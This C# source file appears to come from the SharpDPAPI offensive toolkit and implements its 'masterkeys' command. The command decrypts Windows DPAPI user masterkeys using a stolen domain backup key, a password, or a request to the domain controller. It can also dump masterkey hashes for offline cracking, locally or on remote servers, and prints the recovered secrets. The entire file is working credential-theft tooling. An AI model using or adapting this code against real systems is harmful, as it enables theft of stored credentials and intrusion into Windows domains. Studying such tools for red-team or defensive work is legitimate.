using System;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace SharpDPAPI.Commands
{
    public class Masterkeys : ICommand
    {
        public static string CommandName => "masterkeys";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: User DPAPI Masterkey File Triage\r\n");

            byte[] backupKeyBytes;
            string password;
            Dictionary<string, string> mappings = new Dictionary<string, string>();


            if (arguments.ContainsKey("/pvk"))
            {
                string pvk64 = arguments["/pvk"];
                if (File.Exists(pvk64))
                {
                    backupKeyBytes = File.ReadAllBytes(pvk64);
                }
                else
                {
                    backupKeyBytes = Convert.FromBase64String(pvk64);
                }
                if (arguments.ContainsKey("/server"))
                {
                    Console.WriteLine("[*] Triaging remote server: {0}\r\n", arguments["/server"]);
                    mappings = Triage.TriageUserMasterKeys(backupKeyBytes, true, arguments["/server"]);
                }
                else if (arguments.ContainsKey("/target"))
                {
                    Console.WriteLine("[*] Triaging masterkey target: {0}\r\n", arguments["/target"]);
                    mappings = Triage.TriageUserMasterKeys(backupKeyBytes, true, "", "", arguments["/target"]);
                }
                else
                {
                    Console.WriteLine();
                    mappings = Triage.TriageUserMasterKeys(backupKeyBytes, true);
                }
            }
            else if (arguments.ContainsKey("/password"))
            {
                password = arguments["/password"];
                Console.WriteLine("[*] Will decrypt user masterkeys with password: {0}\r\n", password);
                if (arguments.ContainsKey("/server"))
                {
                    mappings = Triage.TriageUserMasterKeys(null, true, arguments["/server"], password);
                }
                else if (arguments.ContainsKey("/target"))
                {
                    if (!arguments.ContainsKey("/sid"))
                    {
                        Console.WriteLine("[X] When using /password:X with /target:X, a /sid:X (domain user SID) is required!");
                        return;
                    }
                    else {
                        Console.WriteLine("[*] Triaging masterkey target: {0}\r\n", arguments["/target"]);
                        mappings = Triage.TriageUserMasterKeys(null, true, "", password, arguments["/target"], arguments["/sid"]);
                    }
                }
                else
                {
                    mappings = Triage.TriageUserMasterKeys(null, true, "", password);
                }
            }
            else if (arguments.ContainsKey("/hashes"))
            {
                Console.WriteLine("[*] Will dump user masterkey hashes\r\n");
                if (arguments.ContainsKey("/server"))
                {
                    mappings = Triage.TriageUserMasterKeys(null, true, arguments["/server"], "", "", "", true);
                }
                else if (arguments.ContainsKey("/target"))
                {
                    if (!arguments.ContainsKey("/sid"))
                    {
                        Console.WriteLine("[X] When dumping hashes with /target:X, a /sid:X (domain user SID) is required!");
                        return;
                    }
                    else
                    {
                        Console.WriteLine("[*] Triaging masterkey target: {0}\r\n", arguments["/target"]);
                        mappings = Triage.TriageUserMasterKeys(null, true, "", "", arguments["/target"], arguments["/sid"], true);
                    }
                }
                else
                {
                    mappings = Triage.TriageUserMasterKeys(null, true, "", "", "", "", true);
                }
            }
            else if (arguments.ContainsKey("/rpc"))
            {
                Console.WriteLine("[*] Will ask domain controller to decrypt masterkey for us\r\n");
                mappings = Triage.TriageUserMasterKeys(null, rpc: true);
            }
            else
            {
                Console.WriteLine("[X] A /pvk:BASE64 domain DPAPI backup key, /password:X or /hashes must be supplied!");
                return;
            }

            if (!arguments.ContainsKey("/password"))
            {
                if (mappings.Count == 0)
                {
                    Console.WriteLine("\r\n[!] No master keys decrypted!\r\n");
                }
                else
                {
                    var message = arguments.ContainsKey("/hashes") ? "hashes" : "cache";
                    Console.WriteLine("\r\n[*] User master key {0}:\r\n", message);
                    foreach (KeyValuePair<string, string> kvp in mappings)
                    {
                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                    }
                }
            }
        }
    }
}